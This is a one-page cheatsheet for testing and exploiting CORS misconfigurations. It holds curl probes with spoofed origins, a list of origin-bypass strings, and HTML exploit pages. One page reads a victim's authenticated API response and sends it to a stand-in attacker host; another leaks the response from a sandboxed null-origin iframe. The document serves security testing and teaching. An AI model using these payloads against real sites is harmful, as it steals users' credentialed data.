# CORS cheatsheet — the one-page reference

## The class in one line

A foreign-origin page reads an authenticated response — the ACAO
allows your origin AND ACAC lets the cookie ride.

## The two headers that decide it

```
ACAO: <reflected|*|fixed|null>    — which origin may READ
ACAC: true|absent                  — may the credential ride
```

## The verdict table

```
reflected + ACAC:true   → full credentialed read — THE VULN
null + ACAC:true        → opaque-origin read — sandbox/data:
* (alone)               → public read, no credentials — NOT the vuln
* + ACAC:true           → INVALID — browser rejects
fixed-allowlist         → closed unless bypassable
no ACAO                 → not CORS-open
```

## The central probe

```bash
curl -i -b "$CJ" "$BASE/api/me" -H 'Origin: https://evil.com' | \
  grep -iE 'access-control-allow-(origin|credentials)'
```

## The origin-bypass battery

```bash
for o in 'https://evil.com' 'https://target.com.evil.com' \
         'https://eviltarget.com' 'https://sub.target.com' \
         'https://target.com@evil.com' 'null' \
         'https://evil.com?target.com'; do
  curl -s -i -b "$CJ" "$BASE/api/me" -H "Origin: $o" | \
    grep -i 'access-control-allow-origin'; done
```

## The SameSite check — does the cookie ride

```bash
curl -i -b "$CJ" "$BASE/" | grep -i 'set-cookie'
# SameSite=None+Secure → attaches → credentialed read works
# SameSite=Lax/Strict  → doesn't attach → non-credentialed only
```

## The exploit page

```html
<script>
fetch('https://t/api/me',{credentials:'include'})
 .then(r=>r.json())
 .then(d=>fetch('https://attacker/x?d='+btoa(JSON.stringify(d))))
</script>
```

## The null-origin shape

```html
<iframe sandbox="allow-scripts" src="data:text/html,
<script>fetch('https://t/api/me',{credentials:'include'})
.then(r=>r.text()).then(d=>parent.postMessage(d,'*'))</script>">
</iframe>
```

## The falsifier

```
a fixed allowlist with no bypass AND no non-cookie credential —
the read is closed. a `*` on a sensitive endpoint is NOT the vuln.
```

## The boundary

```
a READ → web-cors    a WRITE → web-csrf    a side-channel → xs-leaks
a script-tag serve → JSONP/XSSI    a page broadcast → postMessage
```
